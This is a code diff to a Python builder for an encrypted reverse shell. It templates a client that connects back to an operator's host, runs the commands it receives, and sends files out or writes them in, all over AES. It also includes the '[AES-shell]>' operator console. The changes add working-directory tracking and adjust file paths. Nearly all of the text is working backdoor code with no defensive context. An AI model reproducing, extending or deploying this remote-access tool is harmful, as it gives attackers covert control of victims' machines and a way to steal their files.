@@ -107,6 +107,12 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((host, port))
 success = EncodeAES(cipher, 'EOFEOFEOFEOFEOFYEOFEOFEOFEOFEOFY')
 s.send(success)
+if os.name == 'nt':
+	lsvar = 'cd'
+else:
+	lsvar = 'pwd'
+pp = subprocess.Popen(lsvar, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+pwd = pp.stdout.read().strip() + pp.stderr.read().strip()
 
 while 1:
 	data = s.recv(1024)
@@ -143,7 +149,7 @@ while 1:
 
 	elif decrypted.startswith("download "):
 		try:
-			downpath = decrypted.split(' ')[1]
+			downpath = pwd.strip('**r') + "***" + decrypted.split(' ')[1]
 			with open(downpath, 'rb') as f:
 				encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZ")
 			s.send(encrypted)
@@ -152,7 +158,7 @@ while 1:
 			s.send(encrypted)
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
-		ufilename = decrypted[16:32].strip('*')
+		ufilename = pwd.strip('**r') + '***' + decrypted[16:32].strip('*')
 		f = open(ufilename, 'wb')
 		f.write(decrypted[32:])
 		while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
@@ -163,7 +169,7 @@ while 1:
 			else:
 				f.write(decrypted)
 		f.close()
-		encrypted = EncodeAES(cipher, " [*] %s uploaded!**nEOFEOFEOFEOFEOFX" % (ufilename))
+		encrypted = EncodeAES(cipher, " [*] File uploaded to %s!**nEOFEOFEOFEOFEOFX" % (ufilename))
 		s.send(encrypted)
 
 	elif decrypted.startswith('run '):
@@ -173,9 +179,16 @@ while 1:
 		s.send(encrypted)
 
 	else:
-		proc = subprocess.Popen(decrypted, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		stdoutput = proc.stdout.read() + proc.stderr.read() + 'EOFEOFEOFEOFEOFX'
-		encrypted = EncodeAES(cipher, stdoutput)
+		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, lsvar)
+		proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+		stdout = proc.stdout.read() + proc.stderr.read()
+		if 'is not recognized as an internal or external command' not in stdout:
+			checkpath = ''.join(stdout.split('**n')[-2:]).strip('**n')
+			if ' ' not in checkpath:
+				pwd = checkpath
+
+		result = '**n'.join(stdout.split('**n')[:-1]) + '**nEOFEOFEOFEOFEOFX'
+		encrypted = EncodeAES(cipher, result)
 		s.send(encrypted)
 
 s.close()'''
@@ -195,7 +208,7 @@ try:
 except:
 	serverName = "server.py"
 
-readyscript = finput.replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey)
+readyscript = finput.replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('***', '\\\\').replace('**r', '\\r')
 f = open(outputName, 'w')
 cipherEnc = AES.new(key)
 encrypted = EncodeAES(cipherEnc, readyscript)
@@ -219,7 +232,7 @@ import readline,socket,base64,os,sys,string
 
 def fnextcmd():
 	global nextcmd, downfile, upfile
-	nextcmd, donenothing = False, False
+	nextcmd = False
 	while not nextcmd:
 		nextcmd = raw_input("[AES-shell]>")
 
@@ -245,6 +258,8 @@ def fnextcmd():
 
 	elif nextcmd.startswith('download '):
 		downfile = nextcmd.split(' ')[1].split('/')[-1].split('***')[-1]
+		encrypted = EncodeAES(cipher, nextcmd)
+		s.send(encrypted)
 
 	else:
 		encrypted = EncodeAES(cipher, nextcmd)
